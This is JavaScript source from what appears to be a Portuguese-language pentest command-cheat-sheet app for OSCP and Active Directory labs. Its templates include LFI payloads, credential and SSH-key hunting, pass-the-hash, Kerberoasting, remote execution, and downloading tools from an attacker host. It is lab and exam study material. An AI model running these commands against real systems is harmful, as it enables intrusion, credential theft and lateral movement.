
  {
    category: "SMTP",
    icon: "âœ‰ï¸",
    profile: ["oscp"],
    note: "Enum de users e banners. Ãštil para descobrir contas e fluxos.",
    items: [
      {
        name: "SMTP enum",
        tag: ["smtp", "enum"],
        steps: [
          { title: "Nmap scripts", cmd: "nmap -p 25,465,587 -sV --script \"smtp*\" {ip}" },
          { title: "Banner", cmd: "nc -nv {ip} 25" },
          { title: "VRFY manual", cmd: "nc -nv {ip} 25\nVRFY {user}\nEXPN {user}" }
        ]
      }
    ]
  },

  {
    category: "SNMP",
    icon: "ðŸ“¡",
    profile: ["oscp"],
    note: "Comunidades comuns: public, private. Se abrir, pode vazar muita info.",
    items: [
      {
        name: "SNMP walk",
        tag: ["snmp", "enum"],
        steps: [
          { title: "snmpwalk v2 public", cmd: "snmpwalk -v2c -c public {ip} 1.3.6.1.2.1 | head -n 80" },
          { title: "snmp-check", cmd: "snmp-check {ip} -c public" },
          { title: "Nmap scripts", cmd: "nmap -p 161 -sU --script \"snmp*\" {ip}" }
        ]
      }
    ]
  },

  {
    category: "DNS",
    icon: "ðŸ§ ",
    profile: ["oscp", "ad"],
    note: "Zone transfer e enum de nomes. Em AD, DNS Ã© pista grande.",
    items: [
      {
        name: "DNS enum",
        tag: ["dns", "enum"],
        steps: [
          { title: "Dig ANY", cmd: "dig @{ip} {domain} ANY" },
          { title: "Zone transfer", cmd: "dig @{ip} {domain} AXFR" },
          { title: "Subdomain brute (dnsrecon)", cmd: "dnsrecon -d {domain} -D {wordlist} -t brt -n {ip}" }
        ]
      }
    ]
  },

  {
    category: "NFS",
    icon: "ðŸ§·",
    profile: ["oscp"],
    note: "Shares NFS mal configurados sÃ£o caminho rÃ¡pido para foothold ou privesc.",
    items: [
      {
        name: "NFS enum and mount",
        tag: ["nfs", "enum"],
        steps: [
          { title: "Showmount", cmd: "showmount -e {ip}" },
          { title: "Mount share", cmd: "sudo mount -t nfs {ip}:/SHARE /mnt/nfs -o nolock" },
          { title: "List interesting perms", cmd: "ls -la /mnt/nfs" }
        ]
      }
    ]
  },

  {
    category: "RPC",
    icon: "ðŸ§°",
    profile: ["oscp", "ad"],
    note: "RPC pode ajudar em enum de AD e services Windows.",
    items: [
      {
        name: "RPC enum",
        tag: ["rpc", "enum"],
        steps: [
          { title: "Nmap RPC", cmd: "nmap -p 135,139,445 -sV {ip}" },
          { title: "rpcclient connect", cmd: "rpcclient -U \"{user}%{pass}\" {ip}" },
          { title: "Enum users", cmd: "rpcclient -U \"{user}%{pass}\" {ip} -c \"enumdomusers\"" }
        ]
      }
    ]
  },

  {
    category: "Redis",
    icon: "ðŸ§±",
    profile: ["oscp"],
    note: "Se Redis estiver exposto sem auth, dÃ¡ para enumerar dados e configs.",
    items: [
      {
        name: "Redis quick",
        tag: ["redis", "enum"],
        steps: [
          { title: "Ping", cmd: "redis-cli -h {ip} -p {port} ping" },
          { title: "Info", cmd: "redis-cli -h {ip} -p {port} info | head -n 80" },
          { title: "Keys sample", cmd: "redis-cli -h {ip} -p {port} --scan | head -n 50" }
        ]
      }
    ]
  },

  {
    category: "Pivoting Advanced",
    icon: "ðŸ•³ï¸",
    profile: ["oscp", "ad"],
    note: "Quando SSH nÃ£o resolve, use tunelamento dedicado. Mantenha o fluxo simples.",
    items: [
      {
        name: "Ligolo-ng",
        tag: ["pivot", "ligolo"],
        note: "Excelente para tunelamento com interface TUN e roteamento limpo.",
        steps: [
          { title: "Proxy (attacker)", cmd: "sudo ./proxy -selfcert -laddr 0.0.0.0:{lport}" },
          { title: "Agent (victim)", cmd: "./agent -connect {lhost}:{lport} -ignore-cert" },
          { title: "Create TUN (attacker)", cmd: "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up" },
          { title: "Route to internal net (example)", cmd: "sudo ip route add 10.10.0.0/16 dev ligolo" }
        ]
      },
      {
        name: "sshuttle",
        tag: ["pivot", "sshuttle", "proxy"],
        steps: [
          { title: "Route subnet via SSH", cmd: "sudo sshuttle -r {user}@{ip} 10.10.0.0/16" }
        ]
      },
      {
        name: "socat forward",
        tag: ["pivot", "socat"],
        steps: [
          { title: "TCP local forward", cmd: "socat TCP-LISTEN:{lport},fork,reuseaddr TCP:{ip}:{port}" }
        ]
      }
    ]
  },
  {
    category: "Web Uploads & RCE Helpers",
    icon: "ðŸ§ª",
    profile: ["oscp", "web"],
    note: "Checklist para upload + execuÃ§Ã£o: entender validaÃ§Ãµes, paths, extensÃ£o, e onde o arquivo cai.",
    items: [
      {
        name: "Upload validation checks",
        tag: ["web", "upload", "enum"],
        note: "Antes de tentar execuÃ§Ã£o: descubra onde salva, como renomeia, se tem scan e quais extensÃµes aceita.",
        steps: [
          { title: "Headers Ãºteis", cmd: "curl -i -s {url} | head -n 30" },
          { title: "Upload endpoint (descoberta)", cmd: "ffuf -u {url}/FUZZ -w {wordlist} -t 60 -fc 404 -e .php,.asp,.aspx,.txt,.html" },
          { title: "Verificar respostas e redirects", cmd: "curl -i -s {url}/upload | sed -n '1,60p'" }
        ]
      },
      {
        name: "Multipart upload templates",
        tag: ["web", "upload"],
        note: "Templates de request. Ajuste o parÃ¢metro e o endpoint.",
        steps: [
          { title: "curl multipart (arquivo)", cmd: "curl -i -s -X POST -F \"file=@FILE\" {url}/upload" },
          { title: "curl multipart (nome custom)", cmd: "curl -i -s -X POST -F \"file=@FILE;filename=test.txt\" {url}/upload" },
          { title: "curl multipart (campo alternativo)", cmd: "curl -i -s -X POST -F \"upload=@FILE\" {url}/upload" }
        ]
      },
      {
        name: "Post-upload discovery",
        tag: ["web", "upload", "recon"],
        note: "Depois de subir um arquivo, encontre o path final no app.",
        steps: [
          { title: "Buscar referÃªncia do filename", cmd: "curl -s {url} | grep -i \"test\" -n | head" },
          { title: "Paths comuns", cmd: "for p in uploads upload files static assets images img media; do echo \"$p\"; curl -s -o /dev/null -w \"%{http_code} {url}/$p/FILE\\n\" {url}/$p/FILE; done" }
        ]
      }
    ]
  },

  {
    category: "LFI & Path Traversal Checklist",
    icon: "ðŸ§·",
    profile: ["oscp", "web"],
    note: "Fluxo: identificar parÃ¢metro, testar leitura, validar normalizaÃ§Ã£o e encontrar arquivos alvo.",
    items: [
      {
        name: "Parameter hunting",
        tag: ["web", "lfi", "enum"],
        steps: [
          { title: "Buscar parÃ¢metros comuns", cmd: "ffuf -u \"{url}/?FUZZ=test\" -w params.txt -fs 0" },
          { title: "Grep em HTML/JS (manual)", cmd: "curl -s {url} | grep -Eo \"(file|path|page|template|include|doc|download)=\" | head" }
        ]
      },
      {
        name: "LFI target files (Linux)",
        tag: ["web", "lfi", "linux"],
        note: "Ãštil para validaÃ§Ã£o de leitura. Ajuste o parÃ¢metro conforme o app.",
        steps: [
          { title: "/etc/passwd", cmd: "curl -s \"{url}/?file=/etc/passwd\" | head" },
          { title: "/proc/self/environ", cmd: "curl -s \"{url}/?file=/proc/self/environ\" | head" },
          { title: "Apache logs (paths comuns)", cmd: "curl -s \"{url}/?file=/var/log/apache2/access.log\" | head\ncurl -s \"{url}/?file=/var/log/httpd/access_log\" | head" }
        ]
      },
      {
        name: "LFI target files (Windows)",
        tag: ["web", "lfi", "windows"],
        steps: [
          { title: "win.ini", cmd: "curl -s \"{url}/?file=C:/Windows/win.ini\" | head" },
          { title: "hosts", cmd: "curl -s \"{url}/?file=C:/Windows/System32/drivers/etc/hosts\" | head" }
        ]
      },
      {
        name: "Traversal patterns (manual)",
        tag: ["web", "lfi", "traversal"],
        note: "PadrÃµes para testar normalizaÃ§Ã£o. Use com parcimÃ´nia.",
        steps: [
          { title: "Basic traversal", cmd: "curl -s \"{url}/?file=../../../../etc/passwd\" | head" },
          { title: "URL-encoded dots/slashes", cmd: "curl -s \"{url}/?file=..%2f..%2f..%2f..%2fetc%2fpasswd\" | head" },
          { title: "Double encoding (se aplicÃ¡vel)", cmd: "curl -s \"{url}/?file=..%252f..%252f..%252f..%252fetc%252fpasswd\" | head" }
        ]
      }
    ]
  },

  {
    category: "Windows Lateral Movement (Basics)",
    icon: "ðŸ§­",
    profile: ["oscp", "ad"],
    note: "ValidaÃ§Ã£o de credenciais e execuÃ§Ã£o remota em ambiente controlado. Use sÃ³ quando autorizado.",
    items: [
      {
        name: "Impacket exec (overview)",
        tag: ["windows", "lateral", "impacket"],
        note: "Ferramentas tÃ­picas para execuÃ§Ã£o remota. Escolha conforme permissÃµes e serviÃ§o.",
        steps: [
          { title: "psexec (SMB)", cmd: "psexec.py {domain}/{user}:\"{pass}\"@{ip}" },
          { title: "wmiexec", cmd: "wmiexec.py {domain}/{user}:\"{pass}\"@{ip}" },
          { title: "smbexec", cmd: "smbexec.py {domain}/{user}:\"{pass}\"@{ip}" }
        ]
      },
      {
        name: "WinRM & RDP validate",
        tag: ["windows", "lateral", "access"],
        steps: [
          { title: "evil-winrm", cmd: "evil-winrm -i {ip} -u {user} -p \"{pass}\"" },
          { title: "xfreerdp", cmd: "xfreerdp /v:{ip} /u:{user} /p:\"{pass}\" /dynamic-resolution /cert:ignore" }
        ]
      },
      {
        name: "SMB copy + remote execution helpers",
        tag: ["windows", "lateral", "transfer"],
        steps: [
          { title: "SMB server (attacker)", cmd: "impacket-smbserver share . -smb2support -username {user} -password \"{pass}\"" },
          { title: "Copy from share (Windows)", cmd: "copy \\\\{lhost}\\\\share\\\\FILE C:\\\\Windows\\\\Temp\\\\FILE" }
        ]
      }
    ]
  },

  {
    category: "Service-Specific Enum",
    icon: "ðŸ§°",
    profile: ["oscp", "web", "ad"],
    note: "ServiÃ§os que aparecem muito: Tomcat, Jenkins, WordPress, Git, Docker, Java apps.",
    items: [
      {
        name: "Tomcat",
        tag: ["web", "tomcat", "enum"],
        steps: [
          { title: "Manager endpoints", cmd: "curl -s -o /dev/null -w \"%{http_code} {url}/manager/html\\n\" {url}/manager/html\ncurl -s -o /dev/null -w \"%{http_code} {url}/host-manager/html\\n\" {url}/host-manager/html" },
          { title: "Version hints", cmd: "curl -s {url} | grep -i \"tomcat\" -n | head" }
        ]
      },
      {
        name: "Jenkins",
        tag: ["web", "jenkins", "enum"],
        steps: [
          { title: "Common paths", cmd: "curl -s -o /dev/null -w \"%{http_code} {url}/login\\n\" {url}/login\ncurl -s -o /dev/null -w \"%{http_code} {url}/script\\n\" {url}/script\ncurl -s -o /dev/null -w \"%{http_code} {url}/manage\\n\" {url}/manage" },
          { title: "Headers", cmd: "curl -i -s {url} | grep -i \"jenkins\\|x-jenkins\" -n | head" }
        ]
      },
      {
        name: "WordPress",
        tag: ["web", "wp", "enum"],
        steps: [
          { title: "wp-login/wp-admin", cmd: "curl -s -o /dev/null -w \"%{http_code} {url}/wp-login.php\\n\" {url}/wp-login.php\ncurl -s -o /dev/null -w \"%{http_code} {url}/wp-admin/\\n\" {url}/wp-admin/" },
          { title: "wpscan (se instalado)", cmd: "wpscan --url {url} --enumerate p,t,u --api-token TOKEN_IF_ANY" }
        ]
      },
      {
        name: "Git exposure",
        tag: ["web", "git", "enum"],
        steps: [
          { title: ".git/HEAD", cmd: "curl -s -o /dev/null -w \"%{http_code}\\n\" {url}/.git/HEAD" },
          { title: ".git/config", cmd: "curl -s {url}/.git/config | head -n 40" }
        ]
      },
      {
        name: "Docker hints",
        tag: ["linux", "docker", "enum"],
        steps: [
          { title: "In group docker?", cmd: "id\ngetent group docker 2>/dev/null" },
          { title: "Docker socket exists", cmd: "ls -la /var/run/docker.sock 2>/dev/null" }
        ]
      }
    ]
  },
  {
    category: "Pivoting / Tunneling",
    icon: "ðŸ•³ï¸",
    profile: ["oscp", "ad"],
    note: "Proxy SOCKS e port forwards para enxergar rede interna.",
    items: [
      {
        name: "SSH tunnels",
        tag: ["pivot", "ssh"],
        steps: [
          { title: "SOCKS proxy", cmd: "ssh -D 127.0.0.1:1080 {user}@{ip}" },
          { title: "Local forward", cmd: "ssh -L 127.0.0.1:8888:{ip}:{port} {user}@{ip}" },
          { title: "Remote forward", cmd: "ssh -R 0.0.0.0:{lport}:127.0.0.1:{port} {user}@{ip}" }
        ]
      },
      {
        name: "Proxychains",
        tag: ["pivot", "proxy"],
        steps: [
          { title: "Example (nmap -sT)", cmd: "proxychains -q nmap -sT -Pn -p {port} {ip}" },
          { title: "Example (curl)", cmd: "proxychains -q curl -i {url}" }
        ]
      },
      {
        name: "Chisel",
        tag: ["pivot", "chisel"],
        steps: [
          { title: "Server (attacker)", cmd: "chisel server --reverse -p {lport}" },
          { title: "Client SOCKS (victim)", cmd: "chisel client {lhost}:{lport} socks" },
          { title: "Client reverse port forward", cmd: "chisel client {lhost}:{lport} R:8888:{ip}:{port}" }
        ]
      }
    ]
  }
];


function getRecipes() {
  const stored = loadJSON(STORE.recipes, null);
  return Array.isArray(stored) && stored.length ? stored : DEFAULT_RECIPES;
}

function setRecipes(recipes) {
  saveJSON(STORE.recipes, recipes);
}

let activeTag = "";
let allExpanded = false;

function buildTagSet(recipes) {
  const tags = new Set();
  recipes.forEach(g => g.items.forEach(it => (it.tag || []).forEach(t => tags.add(t))));
  return Array.from(tags).sort((a, b) => a.localeCompare(b));
}

function renderTagChips(tags) {
  els.quickTags.innerHTML = "";

  const mk = (label, isActive, onClick) => {
    const b = document.createElement("button");
    b.className = `chip ${isActive ? "active" : ""}`;
    b.textContent = label;
    b.addEventListener("click", onClick);
    return b;
  };

  els.quickTags.appendChild(mk("all", !activeTag, () => {
    activeTag = "";
    renderCommands();
  }));

  tags.slice(0, 18).forEach(t => {
    els.quickTags.appendChild(mk(t, activeTag === t, () => {
      activeTag = (activeTag === t) ? "" : t;
      renderCommands();
    }));
  });
}

function setTab(tab) {
  els.tabs.forEach(b => {
    const active = b.dataset.tab === tab;
    b.classList.toggle("active", active);
    b.setAttribute("aria-selected", active ? "true" : "false");
  });

  Object.entries(els.views).forEach(([k, v]) => {
    v.classList.toggle("active", k === tab);
  });
}

function setToggleAllLabel() {
  els.btnToggleAll.textContent = allExpanded ? "Collapse sections" : "Expand sections";
}

function expandAll(open) {
  const sections = Array.from(document.querySelectorAll(".section"));
  sections.forEach(sec => {
    const body = sec.querySelector(".sectionBody");
    sec.dataset.open = open ? "true" : "false";
    body.style.display = open ? "grid" : "none";
  });
  allExpanded = open;
  setToggleAllLabel();
}

function normalizeSteps(item) {
  if (Array.isArray(item.steps) && item.steps.length) return item.steps;
  if (item.cmd) return [{ title: item.name || "Command", cmd: item.cmd }];
  return [];
}

function sectionEl(group, values, query, profile, tag) {
  const section = document.createElement("div");
  section.className = "section";
  section.dataset.open = "false";
  section.dataset.accent = stableAccentKey(group.category || "x");
  section.dataset.key = group.category || "";

  const head = document.createElement("div");
  head.className = "sectionHead";

  const left = document.createElement("div");
  left.className = "sectionTitle";
  left.innerHTML = `<span>${group.icon || "â€¢"}</span><span>${escapeHtml(group.category)}</span>`;

  const badge = document.createElement("span");
  badge.className = "badge";

  const chev = document.createElement("span");
  chev.className = "chev";
  chev.textContent = "â–¾";

  head.appendChild(left);
  head.appendChild(badge);
  head.appendChild(chev);

  const body = document.createElement("div");
  body.className = "sectionBody";
  body.style.display = "none";

  const groupAllowed = !group.profile || group.profile.includes(profile) || profile === "all";

  const q = (query || "").trim().toLowerCase();

  const items = (group.items || [])
    .map(it => {
      const steps = normalizeSteps(it).map(s => {
        const cmdPlain = renderCmdPlain(s.cmd, values);
        const cmdHtml = renderCmdHighlightedSafe(s.cmd, values);
        return { ...s, cmdPlain, cmdHtml };
      });
      return { ...it, steps };
    })
    .filter(it => {
      if (!groupAllowed) return false;
      if (tag) {
        const tags = it.tag || [];
        if (!tags.includes(tag)) return false;
      }
      if (!q) return true;

      const hay = [
        it.name || "",
        (it.tag || []).join(" "),
        group.category || "",
        (it.note || ""),
        it.steps.map(s => `${s.title || ""} ${s.cmdPlain || ""}`).join(" ")
      ].join(" ").toLowerCase();

      return hay.includes(q);
    });

  badge.textContent = `${items.length} blocks`;

  if (group.note) {
    const n = document.createElement("div");
    n.className = "note";
    n.textContent = group.note;
    body.appendChild(n);
  }

  items.forEach(it => {
    const itemWrap = document.createElement("div");
    itemWrap.className = "itemWrap";

    const header = document.createElement("div");
    header.className = "itemHeader";

    const title = document.createElement("div");
    title.className = "itemHeaderTitle";
    title.textContent = it.name || "Block";

    const tags = document.createElement("div");
    tags.className = "itemHeaderTags";

    const firstTag = (it.tag && it.tag[0]) ? it.tag[0] : group.category;
    const tagEl = document.createElement("span");
    tagEl.className = "tag";
    tagEl.textContent = firstTag;
    tags.appendChild(tagEl);

    header.appendChild(title);
    header.appendChild(tags);

    itemWrap.appendChild(header);

    if (it.note) {
      const note = document.createElement("div");
      note.className = "note";
      note.textContent = it.note;
      itemWrap.appendChild(note);
    }

    it.steps.forEach(step => {
      if (step.title) {
        const st = document.createElement("div");
        st.className = "stepTitle";
        st.textContent = step.title;
        itemWrap.appendChild(st);
      }

      const card = document.createElement("div");
      card.className = "cmdCard";

      const top2 = document.createElement("div");
      top2.className = "cmdCardTop";

      const t = document.createElement("div");
      t.className = "title";
      t.textContent = "Command";

      const btn2 = document.createElement("button");
      btn2.className = "btn";
      btn2.textContent = "Copy";
      btn2.addEventListener("click", () => copy(step.cmdPlain));

      top2.appendChild(t);
      top2.appendChild(btn2);

      const code2 = document.createElement("div");
      code2.className = "code";
      applyCodeSpacingEl(code2);
      code2.innerHTML = toSpacedLinesHtml(step.cmdHtml);

      card.appendChild(top2);
      card.appendChild(code2);

      itemWrap.appendChild(card);
    });

    body.appendChild(itemWrap);
  });

  head.addEventListener("click", () => {
    const isOpen = section.dataset.open === "true";
    section.dataset.open = (!isOpen).toString();
    body.style.display = isOpen ? "none" : "grid";
  });

  section.appendChild(head);
  section.appendChild(body);
  return section;
}

function renderCommands() {
  const prevOpen = snapshotOpenSections(els.commandsContainer);

  const base = getValues();
  const values = computeDerived(base);

  if (!els.url.value.trim()) els.url.value = values.url;

  saveJSON(STORE.values, values);

  const q = (els.cmdSearch.value || "").trim();
  const profile = values.profile || "all";
  const recipes = getRecipes();

  els.commandsContainer.innerHTML = "";

  recipes.forEach(group => {
    const sec = sectionEl(group, values, q, profile, activeTag);
    els.commandsContainer.appendChild(sec);
  });

  restoreOpenSections(els.commandsContainer, prevOpen);

  setToggleAllLabel();
}

function resetAll() {
  applyValues({
    ip: "10.10.10.10",
    port: "443",
    url: "",
    domain: "corp.local",
    user: "administrator",
    pass: "Password123!",
    wordlist: "/usr/share/wordlists/rockyou.txt",
    hashfile: "/tmp/hashes.txt",
    lhost: "10.10.14.5",
    lport: "4444",
    iface: "tun0",
    proxy: "socks5://127.0.0.1:1080",
    profile: "all"
  });

  saveJSON(STORE.values, getValues());
  activeTag = "";
  els.cmdSearch.value = "";

  allExpanded = false;
  setToggleAllLabel();

  renderAll();
  toast("Resetado.");
}

function exportAll() {
  const payload = {
    version: "pentestbench_export_v4",
    exportedAt: new Date().toISOString(),
    values: getValues(),
    recipes: getRecipes(),
    workspace: {
      log: els.wsLog.value,
      checklist: els.wsChecklist.value,
      creds: els.wsCreds.value
    }
  };

  const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "pentestbench_export.json";
  a.click();
  URL.revokeObjectURL(url);
  toast("Exportado.");
}

async function importAll(file) {
  try {
    const text = await file.text();
    const data = JSON.parse(text);

    if (!data || typeof data !== "object") throw new Error("invalid");

    if (data.values) applyValues(data.values);
    if (Array.isArray(data.recipes)) setRecipes(data.recipes);

    if (data.workspace) {
      els.wsLog.value = data.workspace.log ?? els.wsLog.value;
      els.wsChecklist.value = data.workspace.checklist ?? els.wsChecklist.value;
      els.wsCreds.value = data.workspace.creds ?? els.wsCreds.value;
      persistWorkspace();
    }

    saveJSON(STORE.values, getValues());

    allExpanded = false;
    setToggleAllLabel();

    renderAll();
    toast("Importado.");
  } catch {
    toast("Import invÃ¡lido.");
  }
}

function persistWorkspace() {
  localStorage.setItem(STORE.ws_log, els.wsLog.value);
  localStorage.setItem(STORE.ws_check, els.wsChecklist.value);
  localStorage.setItem(STORE.ws_creds, els.wsCreds.value);
}

function nowStamp() {
  const d = new Date();
  const pad = (n) => String(n).padStart(2, "0");
  const yyyy = d.getFullYear();
  const mm = pad(d.getMonth() + 1);
  const dd = pad(d.getDate());
  const hh = pad(d.getHours());
  const mi = pad(d.getMinutes());
  const ss = pad(d.getSeconds());
  return `${yyyy}-${mm}-${dd} ${hh}:${mi}:${ss}`;
}

const CHEATS = [
  {
    category: "Linux",
    icon: "ðŸ§",
    note: "PÃ³s exploraÃ§Ã£o, priorize estabilizaÃ§Ã£o e enum do host antes de pivotar.",
    items: [
      {
        title: "Shell stabilization",
        note: "Primeiras aÃ§Ãµes apÃ³s shell limitada, estabilize para interatividade e conforto.",
        steps: [
          { title: "Checar shell e subir TTY", cmd: "echo $SHELL\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty; pty.spawn(\"/bin/sh\")'" },
          { title: "Alternativas", cmd: "script -qc /bin/bash /dev/null\nperl -e 'exec \"/bin/bash\";'\nstty rows 40 columns 160" }
        ]
      },
      {
        title: "Enum quick",
        note: "Colete contexto e superfÃ­cies de privesc.",
        steps: [
          { title: "Identidade e SO", cmd: "id\nwhoami\nuname -a\ncat /etc/os-release" },
          { title: "Rede e serviÃ§os", cmd: "ip a\nss -tulpn\nps aux" },
          { title: "Sudo e SUID", cmd: "sudo -l\nfind / -perm -4000 -type f 2>/dev/null" }
        ]
      },
      {
        title: "File transfer rÃ¡pido",
        note: "Quando curl/wget nÃ£o existem ou estÃ£o bloqueados.",
        steps: [
          { title: "Python HTTP server", cmd: "python3 -m http.server 8000\npython -m SimpleHTTPServer 8000" },
          { title: "Baixar sem wget/curl", cmd: "busybox wget http://{attacker_ip}:8000/file\nnc {attacker_ip} 9001 > file" },
          { title: "Base64", cmd: "base64 file > file.b64\nbase64 -d file.b64 > file" },
          { title: "SCP (se tiver SSH)", cmd: "scp file user@{target_ip}:/tmp/\nscp user@{target_ip}:/tmp/file ." }
        ]
      },
      {
        title: "Credential hunting",
        note: "Busca rÃ¡pida por senhas, tokens e configs comuns.",
        steps: [
          { title: "HistÃ³rico e env", cmd: "history\nenv\nprintenv" },
          { title: "Configs comuns", cmd: "grep -R \"pass\\|pwd\\|token\\|key\" /etc 2>/dev/null" },
          { title: "Home dirs", cmd: "ls -la /home\nfind /home -type f \\( -name \"*.conf\" -o -name \"*.env\" -o -name \"*.bak\" \\) 2>/dev/null" },
          { title: "SSH keys", cmd: "find / -name \"id_rsa\" 2>/dev/null\nfind / -name \"authorized_keys\" 2>/dev/null" }
        ]
      },
      {
        title: "Pivot e tunneling",
        note: "Acesso a serviÃ§os internos quando existe segmentaÃ§Ã£o.",
        steps: [
          { title: "Port forward SSH", cmd: "ssh -L 8080:127.0.0.1:80 user@{target_ip}" },
          { title: "SOCKS proxy SSH", cmd: "ssh -D 9050 user@{target_ip}" },
          { title: "Proxychains sanity", cmd: "proxychains nmap -sT -Pn 127.0.0.1" }
        ]
      }
    ]
  },
  {
    category: "Windows",
    icon: "ðŸªŸ",
    note: "Enum de host, privilÃ©gios e serviÃ§os. Procure configuraÃ§Ãµes inseguras e abuso de paths.",
    items: [
      {
        title: "Host enum",
        note: "Base para privesc e movimentaÃ§Ã£o.",
        steps: [
          { title: "Info", cmd: "whoami\nsysteminfo\nipconfig /all\ntasklist /v" },
          { title: "PrivilÃ©gios", cmd: "whoami /priv\nwhoami /groups" }
        ]
      },
      {
        title: "File transfer",
        note: "Formas nativas de baixar e executar ferramentas.",
        steps: [
          { title: "Certutil", cmd: "certutil -urlcache -f http://{attacker_ip}/file.exe file.exe" },
          { title: "PowerShell IWR", cmd: "iwr http://{attacker_ip}/file.exe -OutFile file.exe" },
          { title: "Bitsadmin", cmd: "bitsadmin /transfer job http://{attacker_ip}/file.exe C:\\Temp\\file.exe" },
          { title: "SMB share", cmd: "net use Z: \\\\{attacker_ip}\\share\ncopy Z:\\file.exe ." }
        ]
      },
      {
        title: "Credenciais e sessÃµes",
        note: "Descobrir usuÃ¡rios ativos e credenciais armazenadas.",
        steps: [
          { title: "SessÃµes ativas", cmd: "qwinsta\nquser" },
          { title: "Credenciais salvas", cmd: "cmdkey /list\nvaultcmd /list" },
          { title: "Kerberos tickets", cmd: "klist" }
        ]
      },
      {
        title: "ServiÃ§os e permissÃµes",
        note: "Identificar serviÃ§os explorÃ¡veis e ACLs fracas.",
        steps: [
          { title: "Listar serviÃ§os", cmd: "sc query\nwmic service get name,pathname,startmode" },
          { title: "Unquoted service path", cmd: "wmic service get name,pathname | findstr /i \"Program Files\"" },
          { title: "PermissÃµes de arquivos", cmd: "icacls \"C:\\Program Files\"" }
        ]
      },
      {
        title: "Port forwarding",
        note: "Acesso a serviÃ§os internos sem ferramenta extra.",
        steps: [
          { title: "Netsh portproxy", cmd: "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.0.0.1" },
          { title: "Listar regras", cmd: "netsh interface portproxy show all" }
        ]
      }
    ]
  },
  {
    category: "Active Directory",
    icon: "ðŸ§©",
    note: "Colete dados para graph e valide acessos SMB e Kerberos.",
    items: [
      {
        title: "Coleta",
        steps: [
          { title: "BloodHound", cmd: "bloodhound-python -d {domain} -u {user} -p \"{pass}\" -ns {ip} -c All" },
          { title: "Shares", cmd: "crackmapexec smb {ip} -u {user} -p \"{pass}\" --shares" }
        ]
      },
      {
        title: "Kerberos",
        steps: [
          { title: "ASREPRoast", cmd: "GetNPUsers.py {domain}/ -dc-ip {ip} -usersfile {wordlist} -no-pass" },
          { title: "Kerberoast", cmd: "GetUserSPNs.py {domain}/{user}:\"{pass}\" -dc-ip {ip} -request" }
        ]
      },
      {
        title: "Preflight (DNS e clock)",
        note: "Evita perder tempo com Kerberos quebrando por resoluÃ§Ã£o/horÃ¡rio.",
        steps: [
          { title: "Checar DNS e SRV do domÃ­nio", cmd: "nslookup {domain}\ndig +short _ldap._tcp.dc._msdcs.{domain} SRV\nnmap --script dns-srv-enum --script-args 'dns-srv-enum.domain={domain}' -p 53 {dns_ip}" },
          { title: "Checar hora local e ajustar se necessÃ¡rio", cmd: "date\nsudo timedatectl set-ntp true 2>/dev/null || true\nsudo ntpdate -u {dc_ip} 2>/dev/null || true" },
          { title: "Fix rÃ¡pido /etc/hosts (quando DNS atrapalha)", cmd: "sudo sh -c 'echo \"{dc_ip} {dc_host} {domain}\" >> /etc/hosts'\ngetent hosts {domain}\ngetent hosts {dc_host}" }
        ]
      },
      {
        title: "Enum sem cred (high signal)",
        note: "Descobrir domÃ­nio, polÃ­ticas e superfÃ­cie sem precisar de usuÃ¡rio.",
        steps: [
          { title: "SMB fingerprint e signing", cmd: "nmap -p445 --script smb-protocols,smb-security-mode,smb2-security-mode {ip}\nnetexec smb {ip} -u '' -p '' --shares" },
          { title: "LDAP base (anon bind quando existir)", cmd: "ldapsearch -x -H ldap://{dc_ip} -s base\nldapsearch -x -H ldap://{dc_ip} -b \"\" -s base namingcontexts" }
        ]
      },
      {
        title: "User discovery (pipeline)",
        note: "Gerar userlist rÃ¡pido e validar com kerbrute.",
        steps: [
          { title: "RID brute / lookupsid", cmd: "impacket-lookupsid {domain}/''@{dc_ip} 2>/dev/null | tee lookupsid.txt\nnetexec smb {ip} -u '' -p '' --rid-brute | tee ridbrute.txt" },
          { title: "Extrair nomes e validar", cmd: "cat ridbrute.txt | awk -F'\\\\\\' '{print $2}' | awk '{print $1}' | sort -u > users.txt\nkerbrute userenum --dc {dc_ip} -d {domain} users.txt | tee kerbrute_users.txt" }
        ]
      },
      {
        title: "Credenciais: testar em tudo (rÃ¡pido)",
        note: "Quando pegar 1 cred, valida em SMB, WinRM, RDP, LDAP e MSSQL.",
        steps: [
          { title: "SMB, WinRM, RDP, LDAP, MSSQL", cmd: "netexec smb {ip} -u {user} -p \"{pass}\"\nnetexec winrm {ip} -u {user} -p \"{pass}\"\nnetexec rdp {ip} -u {user} -p \"{pass}\"\nnetexec ldap {dc_ip} -u {user} -p \"{pass}\"\nnetexec mssql {ip} -u {user} -p \"{pass}\"" },
          { title: "Pass-the-hash (NTLM)", cmd: "netexec smb {ip} -u {user} -H {nthash}\nnetexec winrm {ip} -u {user} -H {nthash}" }
        ]
      },
      {
        title: "Roasting (com pÃ³s-processamento)",
        note: "Coleta e deixa pronto para crack offline.",
        steps: [
          { title: "ASREPRoast (sem senha)", cmd: "GetNPUsers.py {domain}/ -dc-ip {dc_ip} -usersfile users.txt -no-pass -outputfile asrep.hashes" },
          { title: "Kerberoast (com cred)", cmd: "GetUserSPNs.py {domain}/{user}:\"{pass}\" -dc-ip {dc_ip} -request -outputfile kerberoast.hashes" },
          { title: "Hashcat exemplos (ajuste wordlist)", cmd: "hashcat -m 18200 asrep.hashes {wordlist}\nhashcat -m 13100 kerberoast.hashes {wordlist}" }
        ]
      },
      {
        title: "AD CS (certipy)",
        note: "Misconfig de templates pode encerrar o lab muito rÃ¡pido.",
        steps: [
          { title: "Find e enum", cmd: "certipy find -u {user} -p \"{pass}\" -dc-ip {dc_ip} -vulnerable -enabled | tee certipy_find.txt" },
          { title: "Request (quando achar template explorÃ¡vel)", cmd: "certipy req -u {user} -p \"{pass}\" -dc-ip {dc_ip} -template {template} -upn {target_upn} -ca {ca_name}" }
        ]
      },
      {
        title: "Responder (captura)",
        note: "SÃ³ use quando fizer sentido no cenÃ¡rio e vocÃª estiver pronto para receber conexÃµes.",
        steps: [
          { title: "Subir Responder", cmd: "sudo responder -I {iface} -dwv" },
          { title: "Checar se SMB signing dificulta relay", cmd: "nmap -p445 --script smb2-security-mode {ip}" }
        ]
      },
      {
